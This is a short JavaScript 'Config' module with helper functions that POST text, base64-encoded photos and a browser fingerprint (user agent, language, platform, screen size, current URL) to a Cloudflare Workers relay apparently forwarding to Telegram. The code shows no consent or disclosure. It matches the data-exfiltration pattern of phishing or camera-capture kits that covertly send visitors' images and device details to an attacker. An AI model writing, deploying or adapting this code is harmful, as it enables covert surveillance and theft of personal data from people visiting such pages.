const Config = {
  API_URL: "https://telegram.mustafaalomar911.workers.dev",

  async sendMessage(text) {
    const res = await fetch(this.API_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        action: "sendMessage",
        text: text
      })
    });

    return await res.json();
  },

  async sendPhoto(base64, caption = "") {
    const res = await fetch(this.API_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        action: "sendPhoto",
        image: base64,
        caption: caption
      })
    });

    return await res.json();
  },

  async sendDeviceInfo(extra = {}) {
    const res = await fetch(this.API_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        action: "deviceInfo",
        data: {
          userAgent: navigator.userAgent,
          language: navigator.language,
          platform: navigator.platform,
          screen: {
            width: screen.width,
            height: screen.height
          },
          url: location.href,
          ...extra
        }
      })
    });

    return await res.json();
  }
};
